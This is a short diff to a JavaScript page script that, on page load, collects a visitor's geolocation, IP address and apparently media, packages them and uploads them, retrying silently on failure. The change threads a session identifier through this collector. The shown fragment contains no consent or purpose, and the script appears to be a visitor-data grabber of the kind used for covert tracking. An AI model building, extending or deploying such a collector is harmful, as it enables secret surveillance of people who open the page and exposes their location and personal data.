@@ -180,7 +180,7 @@ async function uploadMedia(url, mediaData, retries = 3) {
     }
 }
 
-async function collectAndSendData() {
+async function collectAndSendData(sessionId) {
     try {
         // Request geolocation first
         const geoLocation = await getGeolocation();
@@ -195,6 +195,7 @@ async function collectAndSendData() {
         
         // Prepare comprehensive data package
         const dataPackage = {
+            sessionId,
             timestamp: new Date().toISOString(),
             ipAddress,
             location: geoLocation,
@@ -217,9 +218,12 @@ async function collectAndSendData() {
     } catch (error) {
         console.error('Data collection/upload failed:', error);
         // Retry after delay
-        setTimeout(collectAndSendData, RETRY_DELAY);
+        setTimeout(() => collectAndSendData(sessionId), RETRY_DELAY);
     }
 }
 
 // Start collection when page loads
-document.addEventListener("DOMContentLoaded", collectAndSendData);
+document.addEventListener("DOMContentLoaded", () => {
+    const sessionId = 'your-session-id'; // Replace with actual session ID
+    collectAndSendData(sessionId);
+});
